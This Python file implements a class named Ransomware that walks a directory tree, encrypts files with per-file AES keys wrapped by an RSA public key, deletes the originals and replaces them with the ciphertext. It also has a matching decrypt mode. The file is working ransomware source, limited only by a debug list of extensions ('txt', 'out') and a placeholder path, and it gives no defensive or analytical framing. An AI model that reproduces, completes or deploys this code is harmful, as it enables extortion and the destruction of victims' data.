import os
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives.serialization import load_pem_private_key
import stat


def generate_rsa_key_pair(key_size=2048, private_key_file=os.getcwd() + "/private_key.pem"):
    print(private_key_file)
    """
    Generates an RSA key pair and saves the private key as a PEM file.
    Args:
        key_size: int: The size of the key in bits
        private_key_file: str: Path to save the private key PEM file
    Returns:
        tuple: The generated private key and public key
    """
    private_key = rsa.generate_private_key(
        public_exponent=65537,
        key_size=key_size,
        backend=default_backend()
    )
    public_key = private_key.public_key()

    private_key_pem = private_key.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.PKCS8,
        encryption_algorithm=serialization.NoEncryption()
    )

    with open(private_key_file, 'wb') as key_file:
        key_file.write(private_key_pem)

    return private_key, public_key


class Ransomware:
    def __init__(self):
        """
        Initializes an instance of the Ransomware class.

        Args:
            key: 256-bit AES key used to encrypt or decrypt files

        Attributes:
            cryptor: AES: Object with encrypt and decrypt methods, set when key is generated if key is not passed
            file_ext_targets: list<str>: List of strings of allowed file extensions for encryption
        """
        self.key = None
        self.cryptor = None
        self.rsa_key = None
        self.rsa_key_private = None
        self.iv = None
        # debugging
        self.file_ext_targets = ['txt', 'out']

    def generate_key(self):
        """
        Generates a 256-bit AES key for encrypting files. Sets self.cryptor with a AES object
        """
        self.key = get_random_bytes(32)
        self.cryptor = AES.new(self.key, AES.MODE_OFB)
        self.iv = self.cryptor.iv

    def write_key(self, keyfile_name):
        """
        Encrypts the key with RSA and writes it to a keyfile
        """
        encrypted_key = self.rsa_key.encrypt(
            self.key + self.iv,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )
        print(self.key)
        # Convert the length of the encrypted key to bytes
        encrypted_key_length = len(encrypted_key).to_bytes(4, 'big')
        with open(keyfile_name, 'wb') as f:
            # Write the header and the encrypted key to the file
            f.write(encrypted_key_length + encrypted_key)

    def read_key(self, keyfile_name):
        """
        Reads the encrypted key from a file and decrypts it
        Args:
            keyfile_name: str: Path to the file containing the encrypted key
        Returns:
            bytes: The decrypted key
        """
        with open(keyfile_name, 'rb') as f:
            # Read the header to determine the length of the encrypted key
            header = f.read(4)
            encrypted_key_length = int.from_bytes(header, 'big')
            # Read the encrypted key
            encrypted_key = f.read(encrypted_key_length)

            private_key = self.rsa_key_private
        decrypted_key = private_key.decrypt(
            encrypted_key,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )
        self.key = decrypted_key[:-16]
        self.iv = decrypted_key[-16:]
        
        # Generate the AES object with the decrypted key
        self.cryptor = AES.new(self.key, AES.MODE_OFB , iv = self.iv)

        return decrypted_key, encrypted_key_length + 4

    def crypt_root(self, root_dir, encrypted=False):
        """
        Recursively encrypts or decrypts files from root directory with allowed file extensions
        Args:
            root_dir: str: Absolute path of top-level directory
            encrypted: bool: Specify whether to encrypt or decrypt encountered files
        """
        for root, _, files in os.walk(root_dir):
            for f in files:
                abs_file_path = os.path.join(root, f)

                # if not a file extension target, pass
                if not abs_file_path.split('.')[-1] in self.file_ext_targets:
                    continue

                self.crypt_file(abs_file_path, encrypted=encrypted)

    def crypt_file(self, file_path, encrypted=False):
        """
        Encrypts or decrypts a file in blocks, writes the processed data to a new file,
        removes the original file, renames the output file to the original file's name,
        and retains the same permissions.
        Args:
            file_path: str: Absolute path to a file
            encrypted: bool: Specify whether to encrypt or decrypt the file
            block_size: int: Size of each block to read from the file
        """
        output_file_path = file_path + \
            ('.encrypted' if not encrypted else '.decrypted')
        key_len = 0
        if not encrypted:
            self.generate_key()
            self.write_key(output_file_path)
        else:
            _, key_len = self.read_key(file_path)

        with open(file_path, 'rb') as input_file, open(output_file_path, 'ab') as output_file:
            block = input_file.read(key_len)
            
            block = input_file.read()
            if not encrypted:
                print(f'File contents pre-encryption (block): {block}')
                data = self.cryptor.encrypt(block)
                print(f'File contents post-encryption (block): {data}')
            else:
                print(f'File contents encryption (block): {block}')
                data = self.cryptor.decrypt(block)
                print(f'File content post-decryption (block): {data}')
            output_file.write(data)
        # Get the original file's permissions
        file_permissions = stat.S_IMODE(os.lstat(file_path).st_mode)
        # Remove the original file
        os.remove(file_path)
        # Rename the output file to the original file's name
        os.rename(output_file_path, file_path)
        # Set the same permissions for the renamed file
        os.chmod(file_path, file_permissions)

        print(
            f"File {'encrypted' if not encrypted else 'decrypted'}, renamed, and permissions set: {file_path}")

    def run(self, root_dir, mode='encrypt',public_key=None,private_key_pem=None,):
        """Encrypts or decrypts files in the specified root directory.
            Args:
            root_dir: str: Absolute path of the root directory
            mode: str: Specify the mode as 'encrypt' or 'decrypt'
        """
        if mode == 'encrypt' and public_key:
            self.rsa_key = public_key
            encrypted = False
        elif mode == 'decrypt' and private_key_pem:
            print(private_key_pem)
            self.rsa_key_private = self.rsa_key_private = self.rsa_key_private = load_pem_private_key(
                open(private_key_pem, 'rb').read(),
                password=None,
                backend=default_backend()
            )

            encrypted = True
        else:
            raise ValueError(
                "Invalid mode. Mode must be 'encrypt' or 'decrypt' and the necessary key.")

        self.crypt_root(root_dir, encrypted=encrypted)


if __name__ == '__main__':
    rware = Ransomware()
    #_, pubkey = generate_rsa_key_pair()
    
    
    rware.run("/base/path/", mode='decrypt',private_key_pem=os.getcwd() + "/private_key.pem")
    #rware.run("/base/path/", mode='encrypt',public_key=pubkey)
